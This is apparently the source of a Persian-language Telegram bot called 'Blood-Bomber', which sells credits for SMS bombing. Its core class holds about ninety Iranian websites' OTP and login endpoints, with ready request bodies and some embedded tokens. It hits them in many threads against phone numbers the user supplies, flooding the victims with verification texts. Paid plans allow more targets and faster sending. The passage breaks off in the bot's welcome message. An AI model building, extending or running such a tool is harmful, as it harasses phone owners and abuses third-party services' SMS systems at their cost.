import random
import threading
import time
import requests
import os
import sqlite3
import telebot
from telebot import types
from flask import Flask
from datetime import datetime
import traceback

# ==========================================
# 1. وب‌سرور برای سلامت پورت (Render)
# ==========================================
app = Flask(__name__)
@app.route('/')
def health(): return "Bot is running!", 200

# ==========================================
# 2. تنظیمات و دیتابیس
# ==========================================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = 6914309071
CARD_NUMBER = "" 
DB_FILE = "bot_database.db"
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

bot.set_my_commands([
    types.BotCommand("start", "شروع ربات"),
    types.BotCommand("admin", "پنل مدیریت"),
    types.BotCommand("invite", "لینک دعوت"),
    types.BotCommand("help", "راهنما")
])

PANEL_IMAGE_URL = "https://i.imgur.com/Z7lvgzO.jpeg"
VIP_COST = 1000
WHEEL_COOLDOWN = 86400

# ⚠️ جوین اجباری
CHANNEL_1 = "@BloodBomber_Chanel"
CHANNEL_2 = "@YourChannel2"

SERVICE_CONFIG = {
    "free":  {"name": "رایگان", "max_phones": 2,  "delay": 1.0, "max_daily": 3},
    "basic": {"name": "پایه",   "max_phones": 3,  "delay": 0.5, "max_daily": 999},
    "pro":   {"name": "حرفه‌ای","max_phones": 5,  "delay": 0.3, "max_daily": 999},
    "vip":   {"name": "ویژه (VIP)", "max_phones": 10, "delay": 0.1, "max_daily": 999}
}

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    # جدول کاربران
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY, name TEXT, plan TEXT, credits INTEGER, 
        last_daily REAL, sub_expiry REAL, daily_bomb_count INTEGER, last_bomb_date TEXT,
        total_purchases INTEGER DEFAULT 0, invites INTEGER DEFAULT 0,
        last_wheel_spin REAL DEFAULT 0)''')
    # جدول کدهای تخفیف
    c.execute('''CREATE TABLE IF NOT EXISTS coupons (
        code TEXT PRIMARY KEY, discount_percent INTEGER, max_uses INTEGER, current_uses INTEGER DEFAULT 0)''')
    conn.commit()
    conn.close()
init_db()

def get_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row: return {"user_id": row[0], "name": row[1], "plan": row[2], "credits": row[3], "last_daily": row[4], "sub_expiry": row[5], "daily_bomb_count": row[6], "last_bomb_date": row[7], "total_purchases": row[8], "invites": row[9], "last_wheel_spin": row[10]}
    return None

def save_user(user_id, name, plan, credits, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases=0, invites=0, last_wheel_spin=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", 
              (user_id, name, plan, credits, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases, invites, last_wheel_spin))
    conn.commit()
    conn.close()

user_states, pending_approvals, active_bombers, active_gift_codes = {}, {}, {}, {}

PLANS = {
    "basic": {"name": "پایه (۱۰۰ اعتبار)", "price": 150, "credits": 100},
    "pro": {"name": "حرفه‌ای (۵۰۰ اعتبار)", "price": 450, "credits": 500},
    "vip": {"name": "ویژه (۱۲۰۰ اعتبار)", "price": 600, "credits": 1200}
}

# ==========================================
# 3. هسته بمبر (اصلاح‌شده نهایی)
# ==========================================
class Bomber:
    def __init__(self, phone_numbers, user_id, plan):
        self.phone_numbers = phone_numbers.split(",") if "," in phone_numbers else [phone_numbers]
        self.user_id = user_id
        self.plan = plan
        self.services = []
        self.load_services()
        self.session = requests.Session()
        self.stop_event = threading.Event()
        self.success = 0
        self.fail = 0
        self.total_services = len(self.services) * len(self.phone_numbers)

    def load_services(self):
        # ⚠️⚠️⚠️ لیست سرویس‌های خودت رو دقیقاً اینجا کپی کن ⚠️⚠️⚠️
        self.services = [
            # {'name': '...', 'url': '...', 'method': 'POST', 'data': lambda: {...}, 'json': True},
            {'name': 'Digikala Jet', 'url': 'https://api.digikalajet.ir/user/login-register/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Limoome', 'url': 'https://my.limoome.com/api/auth/login/otp', 'method': 'POST', 'data': lambda: {"mobileNumber": self.phone_number.split("+98")[1], "country": "1"}, 'json': False},
            {'name': 'Jabama', 'url': 'https://taraazws.jabama.com/api/v4/account/send-code', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number}, 'json': True},
            {'name': 'SimKhan First', 'url': 'https://www.simkhanapi.ir/api/users/registerV2', 'method': 'POST', 'data': lambda: {"mobileNumber": "0" + self.phone_number.split("+98")[1], "ReSendSMS": False}, 'json': True},
            {'name': 'Gap', 'url': 'https://core.gap.im/v1/user/add.json', 'method': 'GET', 'data': lambda: {"mobile": self.phone_number}, 'json': False},
            {'name': 'Behtarino', 'url': 'https://bck.behtarino.com/api/v1/users/jwt_phone_verification/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Hamrahsport', 'url': 'https://hamrahsport.com/send-otp', 'method': 'POST', 'data': lambda: {"cell": self.phone_number.split("+98")[1], "name": "test", "agree": "1", "send_otp": "1", "otp": ""}, 'json': False},
            {'name': 'Buskool', 'url': 'https://www.buskool.com/send_verification_code', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'SnapFood', 'url': 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass', 'method': 'POST', 'data': lambda: {"cellphone": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Harikashop', 'url': 'https://harikashop.com/login?back=my-account', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1], "id_customer": "", "firstname": "test", "lastname": "test", "password": "test12345", "action": "register", "ajax": "1"}, 'json': False},
            {'name': 'Ghabzino', 'url': 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', 'method': 'POST', 'data': lambda: {"Parameters": {"ApplicationType": "Web", "ApplicationUniqueToken": None, "ApplicationVersion": "1.0.0", "MobileNumber": "0" + self.phone_number.split("+98")[1]}}, 'json': True},
            {'name': 'See5', 'url': 'https://crm.see5.net/api_ajax/sendotp.php', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "action": "sendsms"}, 'json': False},
            {'name': 'Divar', 'url': 'https://api.divar.ir/v5/auth/authenticate', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Alibaba', 'url': 'https://ws.alibaba.ir/api/v3/account/mobile/otp', 'method': 'POST', 'data': lambda: {"phoneNumber": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Mobit', 'url': 'https://api.mobit.ir/api/web/v8/register/register', 'method': 'POST', 'data': lambda: {"number": self.phone_number}, 'json': True},
            {'name': 'PakhshShop', 'url': 'https://www.pakhsh.shop/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "digits_check_mob", "countrycode": "%2B98", "mobileNo": "0" + self.phone_number.split("+98")[1], "csrf": "fdaa7fc8e6", "login": "2", "username": "", "email": "", "captcha": "", "captcha_ses": "", "json": "1", "whatsapp": "0"}, 'json': False},
            {'name': 'Kilid', 'url': 'https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Lendo Register', 'url': 'https://lendo.ir/register', 'method': 'POST', 'data': lambda: {"_token": "mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6", "mobile": "0" + self.phone_number.split("+98")[1], "password": "ibvvb@3#9nc"}, 'json': False},
            {'name': 'GapFilm', 'url': 'https://core.gapfilm.ir/api/v3.1/Account/Login', 'method': 'POST', 'data': lambda: {"Type": "3", "Username": self.phone_number[1:]}, 'json': True},
            {'name': 'Nazdikeh', 'url': 'https://www.nazdikeh.com/api/customers/login-register', 'method': 'POST', 'data': lambda: {"step": 1, "ReturnUrl": "/", "mobile": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Janebi', 'url': 'https://janebi.com/signin', 'method': 'POST', 'data': lambda: {"user_mobile": "0" + self.phone_number.split("+98")[1], "confirm_code": "", "popup": 1, "signin": 1}, 'json': False},
            {'name': '70Kala', 'url': 'https://70kala.ir/wp-json/pinova/user/authenticate', 'method': 'POST', 'data': lambda: {"identifier": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Doozshop', 'url': 'https://doozshop.com/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "mobile_login", "mobile": "0" + self.phone_number.split("+98")[1], "step": "send_code"}, 'json': False},
            {'name': 'Iranmojo', 'url': 'https://iranmojo.com/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"recaptcha_token": None, "phone": "0" + self.phone_number.split("+98")[1], "controller": "auth-register_phone", "action": "iranmojo_guest", "dev": 2024}, 'json': False},
            {'name': '19Kala', 'url': 'https://www.19kala.com/users/register', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "password": "12345678e", "agree": 1}, 'json': True},
            {'name': 'Abadis', 'url': 'https://abadis.ir/user/ajaxcmd/registernew/', 'method': 'POST', 'data': lambda: {"loginID": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Anardoni', 'url': 'https://api.anardoni.com/api/v2/auth/v2/send_code', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "verify_code_type": "login"}, 'json': True},
            {'name': 'Anten', 'url': 'https://api2.anten.ir/ids/api/auth/register', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Boghrat', 'url': 'https://admapi.boghrat.com/boghratsite/Account/RegisterOTP', 'method': 'POST', 'data': lambda: {"Phonenumber": "0" + self.phone_number.split("+98")[1], "recaptcha": None, "AppointmentCode": ""}, 'json': True},
            {'name': 'Delino', 'url': 'https://www.delino.com/User/PreRegister', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'EBPNovin', 'url': 'https://www.ebpnovin.com/index.php?route=users/login', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Esam', 'url': 'https://api.esam.ir/api/account/v3/RegisterUserv3', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "present_type": "WebApp", "registration_method": 0, "serialNumber": ""}, 'json': True},
            {'name': 'Flytoday', 'url': 'https://www.flytoday.ir/api/collect', 'method': 'POST', 'data': lambda: {"plaintext": "+98" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'IranConcert', 'url': 'https://www.iranconcert.com/user/check', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Iranecar', 'url': 'https://nextapi.iranecar.com/auth/api/v1/User/GetUserBaseInfo', 'method': 'POST', 'data': lambda: {"emailOrNumber": "0" + self.phone_number.split("+98")[1], "userType": "siteUser"}, 'json': True},
            {'name': 'Malltina', 'url': 'https://api.malltina.com/api/v2/check-user', 'method': 'POST', 'data': lambda: {"user": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Mizito', 'url': 'https://app.mizito.ir/capi/session/register', 'method': 'POST', 'data': lambda: {"step": 1, "activate_method": "sms", "email": "", "phone": "0" + self.phone_number.split("+98")[1], "username": "0" + self.phone_number.split("+98")[1], "pin_code": "", "firstname": "", "lastname": "", "workspace_name": "", "password": "", "repassword": "", "teammates": [{"name": "", "email_phone": ""}], "validated": False}, 'json': True},
            {'name': 'Netbarg', 'url': 'https://netbarg.com/tehran/users/loginByMobile/', 'method': 'POST', 'data': lambda: {"_method": "POST", "phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Ravandarman', 'url': 'https://papi.ravandarman.com/register/fast', 'method': 'POST', 'data': lambda: {"firstName": "f", "lastName": "q", "gender": 0, "registerField": "tel", "termsAndConditions": True, "tel": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Sheypoor', 'url': 'https://www.sheypoor.com/api/v10.0.0/auth/send', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'AbreHamrahi', 'url': 'https://abrehamrahi.ir/api/v6/profile/auth/generate-code/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number.split("+98")[1], "prefix": "+98"}, 'json': True},
            {'name': 'Axon', 'url': 'https://axon.me/services/api/identity-service/v1/users/register-login/phr', 'method': 'POST', 'data': lambda: {"phoneNumber": "0" + self.phone_number.split("+98")[1], "serviceName": "AXON", "needTag": True, "sendAudioOtp": False}, 'json': True},
            {'name': 'Bimebazar', 'url': 'https://bimebazar.com/accounts/api/login_sec/', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1], "type": "sms"}, 'json': True},
            {'name': 'Booking.ir', 'url': 'https://ws.booking.ir/nagaapi/api/v2/account/sendmobileverificationcode/', 'method': 'POST', 'data': lambda: {"mobile": self.phone_number.split("+98")[1], "countryCode": "ir"}, 'json': True},
            {'name': 'Cafebazaar', 'url': 'https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest', 'method': 'POST', 'data': lambda: {"properties": {"language": 2, "clientID": "ejzbxi83legfl7xgp32qxq4ye4g38oyf", "deviceID": "ejzbxi83legfl7xgp32qxq4ye4g38oyf", "clientVersion": "web"}, "singleRequest": {"getOtpTokenRequest": {"username": "98" + self.phone_number.split("+98")[1]}}}, 'json': True},
            {'name': 'Eligasht', 'url': 'https://api2.eligasht.com/api/account/register', 'method': 'POST', 'data': lambda: {"userName": "0" + self.phone_number.split("+98")[1], "recaptchaToken": None}, 'json': True},
            {'name': 'ESeminar', 'url': 'https://api.eseminar.tv/api/v1/auth/otp/send', 'method': 'POST', 'data': lambda: {"method": "register", "mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Footballi', 'url': 'https://api.footballi.net/api/v2/user/check', 'method': 'POST', 'data': lambda: {"login": "0" + self.phone_number.split("+98")[1], "country_code": "+98"}, 'json': True},
            {'name': 'GapFilm v3.2', 'url': 'https://core.gapfilm.ir/api/v3.2/Account/Login', 'method': 'POST', 'data': lambda: {"Method": 1, "PhoneNo": self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'GSM.ir', 'url': 'https://marketplace.gsm.ir/api/v1/user/login/', 'method': 'POST', 'data': lambda: {"phone_number": "+98" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Haal', 'url': 'https://haal.ir/api/v2/ConsultantConsult/CheckConsultantExist', 'method': 'POST', 'data': lambda: {"Mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'HamyarWP', 'url': 'https://hamyarwp.com/wp-admin/admin-ajax.php?action=hfl_login_with_phone&t=1776772989081', 'method': 'POST', 'data': lambda: {"username": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'MrBilit SMS', 'url': 'https://content.mrbilit.ir/sms/get_app/send?to=0' + self.phone_number.split("+98")[1], 'method': 'POST', 'data': lambda: {}, 'json': False},
            {'name': 'Pezeshket', 'url': 'https://api.pezeshket.com/core/v1/auth/requestCodeByMobileV2', 'method': 'POST', 'data': lambda: {"mobileNumber": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Ring', 'url': 'https://ring.ir/api/v1/auth/otp', 'method': 'POST', 'data': lambda: {"mobile": "+98" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Roboo', 'url': 'https://api.roboo.ir/api/Users/SendVerificationCode?PhoneNumber=0' + self.phone_number.split("+98")[1] + '&code=1302817798429812', 'method': 'POST', 'data': lambda: {}, 'json': False},
            {'name': 'Salamati24', 'url': 'https://www.salamati24.com/api/activationcode?mobile=0' + self.phone_number.split("+98")[1] + '&as_register=1&roleId=-2', 'method': 'GET', 'data': lambda: {}, 'json': False},
            {'name': 'Talasea', 'url': 'https://api.talasea.ir/api/auth/sentOTP', 'method': 'POST', 'data': lambda: {"phoneNumber": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Tosinso', 'url': 'https://tosinso.com/api/auth/send-code', 'method': 'POST', 'data': lambda: {"type": "mobile", "value": self.phone_number.split("+98")[1], "countryCode": "+98"}, 'json': True},
            {'name': 'Uploadkon', 'url': 'https://uploadkon.ir/ucp.php?go=sendotp', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Virgool', 'url': 'https://virgool.io/api2/app/auth/verify', 'method': 'POST', 'data': lambda: {"identifier": "+98" + self.phone_number.split("+98")[1], "method": "phone", "type": "register"}, 'json': True},
            {'name': 'Yarai', 'url': 'https://chat.yarai.ir/api/v1/otps/request-otp', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1], "isAndroid": False}, 'json': True},
            {'name': 'Zigap', 'url': 'https://gateway.zigap.ir/api/v1.9/authenticate/sendotp', 'method': 'POST', 'data': lambda: {"phoneNumber": "+98" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'shadmessenger12', 'url': 'https://shadmessenger12.iranlms.ir/', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'messengerg2c4', 'url': 'https://messengerg2c4.iranlms.ir/', 'method': 'POST', 'data': lambda: {"phone": self.phone_number}, 'json': True},
            {'name': 'Baradarantoy', 'url': 'https://baradarantoy.ir/send_confirm_sms_ajax.php', 'method': 'POST', 'data': lambda: {"user_tel": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Chechilas', 'url': 'https://chechilas.com/user/login', 'method': 'POST', 'data': lambda: {"mob": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Badparak', 'url': 'https://badparak.com/register/request_verification_code', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Ubike', 'url': 'https://ubike.ir/index.php?route=extension/module/websky_otp/send_code', 'method': 'POST', 'data': lambda: {"telephone": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Primashop', 'url': 'https://primashop.ir/index.php?route=extension/module/websky_otp/send_code', 'method': 'POST', 'data': lambda: {"telephone": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Payagym', 'url': 'https://payagym.com/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "action": "kerasno_proform_register_inline_send"}, 'json': False},
            {'name': 'Bartarinha', 'url': 'https://bartarinha.com/Advertisement/Users/RequestLoginMobile', 'method': 'POST', 'data': lambda: {"mobileNo": "0" + self.phone_number.split("+98")[1], "X-Requested-With": "XMLHttpRequest"}, 'json': False},
            {'name': 'Manoshahr', 'url': 'https://manoshahr.ir/jq.php', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "class_name": "public_login", "function_name": "sendCode"}, 'json': False},
            {'name': 'Nalinoco', 'url': 'https://www.nalinoco.com/api/customers/login-register', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "ReturnUrl": "/", "step": "1"}, 'json': True},
            {'name': 'Dastaneman', 'url': 'https://dastaneman.com/User/SendCode', 'method': 'POST', 'data': lambda: {"mobile": "0098" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Kanoonbook', 'url': 'https://www.kanoonbook.ir/store/customer_otp', 'method': 'POST', 'data': lambda: {"customer_username": self.phone_number.split("+98")[1], "task": "customer_phone"}, 'json': True},
            {'name': 'Cheshmandazketab', 'url': 'https://www.cheshmandazketab.ir/Register', 'method': 'POST', 'data': lambda: {"phone": "0" + self.phone_number.split("+98")[1], "login": "1"}, 'json': False},
            {'name': 'Janebi Alt', 'url': 'https://janebi.com/signin?do', 'method': 'POST', 'data': lambda: {"resend": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'SimKhan Resend', 'url': 'https://www.simkhanapi.ir/api/users/registerV2', 'method': 'POST', 'data': lambda: {"mobileNumber": "0" + self.phone_number.split("+98")[1], "ReSendSMS": True}, 'json': True},
            {'name': 'Hiss Bakala', 'url': 'https://hiss.ir/bakala/ajax/send_code/', 'method': 'POST', 'data': lambda: {"action": "bakala_send_code", "phone_email": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Twsms', 'url': 'https://twsms.ir/client/register.php', 'method': 'POST', 'data': lambda: {"mobile": "0" + self.phone_number.split("+98")[1], "agree": "agree", "sendsms": "1"}, 'json': False},
            {'name': 'Account724', 'url': 'https://account724.com/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "stm_login_register", "type": "mobile", "input": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Shimashoes', 'url': 'https://shimashoes.com/api/customer/member/register/', 'method': 'POST', 'data': lambda: {"email": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Novinparse', 'url': 'https://novinparse.com/Page/PageAction.aspx', 'method': 'POST', 'data': lambda: {"Action": "SendVerifyCode", "verifyCode": "", "repeatFlag": "true", "mobile": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Dalfak', 'url': 'https://www.dalfak.com/api/auth/sendVerificationCode', 'method': 'POST', 'data': lambda: {"type": 1, "value": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Parkbag', 'url': 'https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber', 'method': 'POST', 'data': lambda: {"ReturnUrl": "https://parkbag.com/", "MobaileNumber": self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Mahouney', 'url': 'https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber', 'method': 'POST', 'data': lambda: {"ReturnUrl": "https://mahouney.com/", "MobaileNumber": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Nikanbike', 'url': 'https://nikanbike.com/', 'method': 'POST', 'data': lambda: {"controller": "authentication", "back": "my-account", "fc": "module", "ajax": "true", "module": "iverify", "phone_mobile": "0" + self.phone_number.split("+98")[1], "SubmitCheck": ""}, 'json': False},
            {'name': 'Microele', 'url': 'https://www.microele.com/login?back=my-account', 'method': 'POST', 'data': lambda: {"id_customer": "", "back": ",my-account", "firstname": "123", "lastname": "123", "password": "123456", "action": "register", "username": "0" + self.phone_number.split("+98")[1], "ajax": "1"}, 'json': False},
            {'name': 'RastarAccessory', 'url': 'https://rastaraccessory.ir/api/v1/sessions/login_request', 'method': 'POST', 'data': lambda: {"mobile_phone": "0" + self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Myroz', 'url': 'https://myroz.ir/wp-admin/admin-ajax.php', 'method': 'POST', 'data': lambda: {"action": "stm_login_register", "type": "mobile", "input": "0" + self.phone_number.split("+98")[1]}, 'json': False},
            {'name': 'Sunnybook', 'url': 'https://sunnybook.ir/Home/RegisterUser', 'method': 'POST', 'data': lambda: {"name": "Mr", "password": "123456", "mobile": self.phone_number.split("+98")[1]}, 'json': True},
            {'name': 'Adinehbook', 'url': 'https://www.adinehbook.com/gp/flex/sign-in.html', 'method': 'POST', 'data': lambda: {"action": "sign", "phone_cell_or_email": "0" + self.phone_number.split("+98")[1]}, 'json': False},
        ]

    def send_request(self, service, phone):
        if self.stop_event.is_set(): return
        
        self.phone_number = phone 
        
        try:
            try:
                data = service['data'](phone)
            except TypeError:
                data = service['data']()
                
            if isinstance(data, dict):
                if 'phone' in data: data['phone'] = phone
                if 'mobile' in data: data['mobile'] = phone
                if 'mobileNumber' in data: data['mobileNumber'] = phone
                if 'cellphone' in data: data['cellphone'] = phone
                if 'username' in data: data['username'] = phone
                if 'cell' in data: data['cell'] = phone
                if 'mobileNo' in data: data['mobileNo'] = phone
                if 'phoneNumber' in data: data['phoneNumber'] = phone

            headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
            method = service['method'].upper()
            use_json = service.get('json', False)
            
            delay = SERVICE_CONFIG.get(self.plan, SERVICE_CONFIG["free"])["delay"]
            
            if method == 'POST':
                if use_json: resp = self.session.post(service['url'], json=data, headers=headers, timeout=5)
                else: resp = self.session.post(service['url'], data=data, headers=headers, timeout=5)
            else:
                resp = self.session.get(service['url'], params=data, headers=headers, timeout=5)
                
            if resp.status_code in (200, 201, 202, 204): self.success += 1
            else: self.fail += 1
        except Exception:
            self.fail += 1

    def worker(self, subset, phone):
        for service in subset:
            if self.stop_event.is_set(): break
            self.send_request(service, phone)
            time.sleep(SERVICE_CONFIG.get(self.plan, SERVICE_CONFIG["free"])["delay"])

    def start(self):
        if not self.services:
            bot.send_message(self.user_id, "لیست سرویس‌ها خالی است.")
            return
            
        self.success, self.fail = 0, 0
        chunk_size = max(1, len(self.services) // 15)
        threads = []
        
        status_msg = bot.send_message(self.user_id, f"⏳ **در حال ارسال...**\nمیزان پیشرفت: 0/{self.total_services}", parse_mode='Markdown')
        
        for phone in self.phone_numbers:
            if not phone.startswith("+"): phone = "+98" + phone.lstrip("0")
            chunks = [self.services[i:i + chunk_size] for i in range(0, len(self.services), chunk_size)]
            for chunk in chunks:
                t = threading.Thread(target=self.worker, args=(chunk, phone))
                t.start()
                threads.append(t)
                
        def update_status():
            last_update = time.time()
            while any(t.is_alive() for t in threads):
                if time.time() - last_update > 2:
                    done = self.success + self.fail
                    percent = int((done / self.total_services) * 100) if self.total_services > 0 else 0
                    bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
                    try:
                        bot.edit_message_text(
                            f"⏳ **در حال ارسال...**\n\n"
                            f"✅ موفق: {self.success}\n"
                            f"❌ ناموفق: {self.fail}\n\n"
                            f"📊 [{bar}] {percent}%\n"
                            f"میزان پیشرفت: {done}/{self.total_services}",
                            self.user_id, status_msg.message_id, parse_mode='Markdown'
                        )
                    except: pass
                    last_update = time.time()
                time.sleep(0.5)
                
        for t in threads: t.join()
        update_status()
        
        percent = int((self.success / self.total_services) * 100) if self.total_services > 0 else 0
        bot.edit_message_text(
            f"🏁 **گزارش نهایی:**\n\n"
            f"✅ موفق: {self.success}\n"
            f"❌ ناموفق: {self.fail}\n"
            f"📊 درصد موفقیت: {percent}%",
            self.user_id, status_msg.message_id, parse_mode='Markdown'
        )
        if self.user_id in active_bombers: del active_bombers[self.user_id]

# ==========================================
# 4. منوی شیشه‌ای (Inline)
# ==========================================
def get_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🆓 اجرای رایگان", callback_data="menu_bomb_free"),
        types.InlineKeyboardButton("💎 اجرای اشتراکی", callback_data="menu_bomb_sub")
    )
    markup.add(
        types.InlineKeyboardButton("💳 خرید اعتبار", callback_data="menu_buy"),
        types.InlineKeyboardButton("📋 حساب کاربری", callback_data="menu_profile")
    )
    markup.add(
        types.InlineKeyboardButton("🎰 گردونه شانس", callback_data="menu_wheel"),
        types.InlineKeyboardButton("🎁 جایزه روزانه", callback_data="menu_daily")
    )
    markup.add(
        types.InlineKeyboardButton("🤖 هوش مصنوعی", callback_data="menu_ai"),
        types.InlineKeyboardButton("🏆 برترین‌ها", callback_data="menu_leaderboard")
    )
    markup.add(types.InlineKeyboardButton("🎧 پشتیبانی", callback_data="menu_support"))
    markup.add(types.InlineKeyboardButton("🔑 کد هدیه", callback_data="menu_gift"))
    return markup

# ==========================================
# 5. بررسی جوین اجباری
# ==========================================
def is_user_joined(user_id):
    try:
        member_1 = bot.get_chat_member(CHANNEL_1, user_id)
        if member_1.status not in ['member', 'administrator', 'creator']:
            return False
        if CHANNEL_2 and CHANNEL_2 != "@YourChannel2":
            member_2 = bot.get_chat_member(CHANNEL_2, user_id)
            if member_2.status not in ['member', 'administrator', 'creator']:
                return False
        return True
    except Exception as e:
        print(f"Join Check Error: {e}")
        return True

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = str(message.from_user.id)
    
    if not is_user_joined(user_id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("📢 عضویت در کانال ۱", url=f"https://t.me/{CHANNEL_1.replace('@', '')}"))
        if CHANNEL_2 and CHANNEL_2 != "@YourChannel2":
            markup.add(types.InlineKeyboardButton("📢 عضویت در کانال ۲", url=f"https://t.me/{CHANNEL_2.replace('@', '')}"))
        markup.add(types.InlineKeyboardButton("✅ عضو شدم", callback_data="check_join"))
        bot.send_message(message.chat.id, "⚠️ **برای استفاده از ربات، ابتدا باید در کانال‌های ما عضو شوید!**", reply_markup=markup, parse_mode='Markdown')
        return
        
    user = get_user(user_id)
    
    args = message.text.split()
    if len(args) > 1 and args[1].startswith("ref_"):
        inviter_id = args[1].replace("ref_", "")
        if inviter_id != user_id:
            inviter = get_user(inviter_id)
            if inviter:
                inviter["invites"] += 1
                inviter["credits"] += 5
                save_user(**inviter)
                try: bot.send_message(inviter_id, f"🎉 یک نفر با لینک شما وارد شد! ۵ اعتبار هدیه گرفتید.")
                except: pass

    if not user:
        save_user(user_id, message.from_user.first_name, "free", 0, 0, 0, 0, "2000-01-01", 0, 0, 0)
        
    bot_info = bot.get_me()
    bot_id = bot_info.id
    user_mention = f"[{message.from_user.first_name}](tg://user?id={user_id})"
    bot_mention = f"[Blood-Bomber](tg://user?id={bot_id})"
    
    caption = (
        f"سلام {user_mention} عزیز! 👋\n"
        f"به ربات **{bot_mention}** خوش آمدید.\n"
